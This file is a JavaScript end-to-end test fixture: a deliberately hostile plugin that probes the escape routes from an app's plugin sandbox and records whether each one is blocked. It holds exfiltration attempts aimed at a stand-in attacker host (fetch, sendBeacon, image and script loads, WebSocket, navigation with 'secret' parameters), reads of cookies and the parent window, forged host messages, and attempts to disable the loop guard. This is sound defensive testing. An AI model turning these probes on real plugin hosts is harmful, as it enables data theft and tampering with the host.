// A hostile plugin for e2e/plugins/sandbox.spec.ts: it tries every way out of its sandbox that a
// real attacker would, from its worker and from its panel's frame, and reports what happened.
// Each probe records "blocked" when the browser or the host stopped it, or "LEAKED: …" when it got
// something it must never get. Fire-and-forget channels (beacons, images, scripts, navigations)
// are judged by the spec, which records every request that reaches the other origin. Only `ui:panels` and `storage` are granted (to render and to pass
// the worker's results to the panel); `pages:read` is not, so the API must refuse it too.
// Test fixture only: it lives in the test suite and is never listed in a registry.

const EVIL = 'https://evil.tessera.test';

/** Runs one probe: `attempt` returns a leak description, or throws/returns null when blocked. */
async function probe(results, name, attempt) {
  try {
    const leak = await Promise.race([
      attempt(),
      new Promise((resolve) => setTimeout(() => resolve(null), 2000)),
    ]);
    results[name] = leak ? `LEAKED: ${String(leak).slice(0, 200)}` : 'blocked';
  } catch {
    results[name] = 'blocked';
  }
}

async function workerProbes(api) {
  const results = {};
  await probe(results, 'worker: read pages without permission', async () => {
    const pages = await api.pages.list();
    return `read ${pages.length} pages`;
  });
  await probe(results, 'worker: fetch another origin', async () => {
    const response = await fetch(`${EVIL}/steal?from=worker`, { mode: 'no-cors' });
    return `fetch answered (${response.type})`;
  });
  await probe(results, 'worker: open a WebSocket', async () => {
    const socket = new WebSocket('wss://evil.tessera.test/socket');
    return new Promise((resolve) => {
      socket.onopen = () => resolve('socket opened');
      socket.onerror = () => resolve(null);
    });
  });
  await probe(results, 'worker: importScripts from another origin', async () => {
    // Module workers have no importScripts; a classic one would meet the CSP.
    self.importScripts(`${EVIL}/payload.js`);
    return 'script imported';
  });
  await probe(results, 'worker: IndexedDB', async () => {
    await new Promise((resolve, reject) => {
      const request = indexedDB.open('stolen');
      request.onsuccess = resolve;
      request.onerror = reject;
    });
    return 'IndexedDB opened';
  });
  await probe(results, 'worker: reach the app window', async () =>
    typeof self.parent !== 'undefined' && self.parent !== self ? 'has a parent' : null,
  );
  await probe(results, 'worker: forge a host message', async () => {
    // The worker speaks to its frame only; a forged "response" must change nothing on the host.
    self.postMessage({ type: 'response', id: 1, result: { granted: ['pages:write'] } });
    return null;
  });
  return results;
}

function uiProbes() {
  const results = {};
  const run = (name, attempt) => probe(results, name, attempt);
  return Promise.all([
    run('panel: read the app document', async () => window.parent.document.title),
    run('panel: read the top window location', async () => window.top.location.href),
    run('panel: read cookies', async () => (document.cookie ? document.cookie : null)),
    run('panel: localStorage', async () => {
      window.localStorage.setItem('probe', '1');
      return `localStorage works (${window.localStorage.length} keys)`;
    }),
    run('panel: IndexedDB', async () => {
      await new Promise((resolve, reject) => {
        const request = indexedDB.open('stolen');
        request.onsuccess = resolve;
        request.onerror = reject;
      });
      return 'IndexedDB opened';
    }),
    run('panel: fetch another origin', async () => {
      const response = await fetch(`${EVIL}/steal?from=panel`, { mode: 'no-cors' });
      return `fetch answered (${response.type})`;
    }),
    run('panel: beacon to another origin', async () => {
      // sendBeacon may return true even when the CSP drops the request: the spec's record of
      // every request that reaches the other origin is what decides.
      navigator.sendBeacon(`${EVIL}/beacon`, 'secret');
      return null;
    }),
    run(
      'panel: load an image from another origin',
      async () =>
        new Promise((resolve) => {
          const image = new Image();
          image.onload = () => resolve('image loaded');
          image.onerror = () => resolve(null);
          image.src = `${EVIL}/pixel.png?secret=1`;
        }),
    ),
    run('panel: open a popup', async () => (window.open(`${EVIL}/popup`) ? 'popup opened' : null)),
    run(
      'panel: add a script from another origin',
      async () =>
        new Promise((resolve) => {
          const script = document.createElement('script');
          script.src = `${EVIL}/payload.js`;
          script.onload = () => resolve('script loaded');
          script.onerror = () => resolve(null);
          document.head.append(script);
        }),
    ),
    // The host instruments panel code so a loop can be stopped (packages/plugins/src/sandbox/
    // instrument.ts); code it never saw must not run, and its guard must stay in place.
    run(
      'panel: run a script it made itself',
      async () =>
        new Promise((resolve) => {
          const script = document.createElement('script');
          script.src = URL.createObjectURL(
            new Blob(['window.madeItself = true;'], { type: 'text/javascript' }),
          );
          script.onload = () => resolve(window.madeItself ? 'its own script ran' : null);
          script.onerror = () => resolve(null);
          document.head.append(script);
        }),
    ),
    run('panel: import a module it made itself', async () => {
      const url = URL.createObjectURL(
        new Blob(['export default 42;'], { type: 'text/javascript' }),
      );
      const module = await import(url);
      return module.default === 42 ? 'its own module ran' : null;
    }),
    run('panel: switch off the loop guard', async () => {
      const name = Object.getOwnPropertyNames(window).find((key) => key.startsWith('$' + '$'));
      if (!name) return 'there is no guard';
      const guard = window[name];
      for (const attempt of [
        () => {
          window[name] = () => undefined;
        },
        () => delete window[name],
        () => Object.defineProperty(window, name, { value: () => undefined }),
      ]) {
        try {
          attempt();
        } catch {
          // Refused.
        }
      }
      return window[name] === guard ? null : 'replaced the guard';
    }),
    run('panel: eval', async () => {
      // eslint-disable-next-line no-eval -- the probe checks that the CSP forbids it
      const value = (0, eval)('1 + 1');
      return value === 2 ? 'eval ran' : null;
    }),
    run('panel: read the CSP nonce it runs under', async () => {
      // The frame's bootstrap carries the app's nonce under a strict app policy.
      const nonced = document.querySelector('[nonce]');
      const policy = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return (nonced && (nonced.nonce || nonced.getAttribute('nonce'))) || policy?.content || null;
    }),
    run('panel: forge a message to the app', async () => {
      window.parent.postMessage({ type: 'request', id: 1, method: 'pages.list', params: {} }, '*');
      window.top.postMessage({ type: 'request', id: 2, method: 'pages.delete', params: {} }, '*');
      return null;
    }),
  ]).then(() => results);
}

export default {
  __tesseraPlugin: 1,
  async activate(api) {
    api.ui.addPanel({ id: 'probes', title: 'Escape probes', icon: '🕳️' });
    await api.storage.set('worker', await workerProbes(api));
  },
  panels: {
    async probes({ root, api }) {
      const panel = await uiProbes();
      let worker = await api.storage.get('worker');
      for (let attempt = 0; !worker && attempt < 50; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 100));
        worker = await api.storage.get('worker');
      }
      const all = { ...(worker ?? { 'worker: results': 'missing' }), ...panel };
      const list = document.createElement('ul');
      for (const [name, result] of Object.entries(all)) {
        const item = document.createElement('li');
        item.dataset.probe = name;
        item.dataset.result = result;
        item.textContent = `${name}: ${result}`;
        list.append(item);
      }
      root.append(list);
      // Navigations go last, on request: a blocked navigation can replace this frame's document
      // with the browser's error page, which would take the results above with it.
      const navigate = document.createElement('button');
      navigate.type = 'button';
      navigate.textContent = 'Try to navigate away';
      navigate.addEventListener('click', () => {
        try {
          window.top.location.href = `${EVIL}/phish`;
        } catch {
          // Blocked: no allow-top-navigation.
        }
        const form = document.createElement('form');
        form.action = `${EVIL}/form`;
        form.method = 'POST';
        form.target = '_top';
        document.body.append(form);
        try {
          form.submit();
        } catch {
          // Blocked: form-action 'none'.
        }
        window.location.href = `${EVIL}/frame?secret=1`;
      });
      root.append(navigate);
      root.dataset.done = 'true';
    },
  },
};
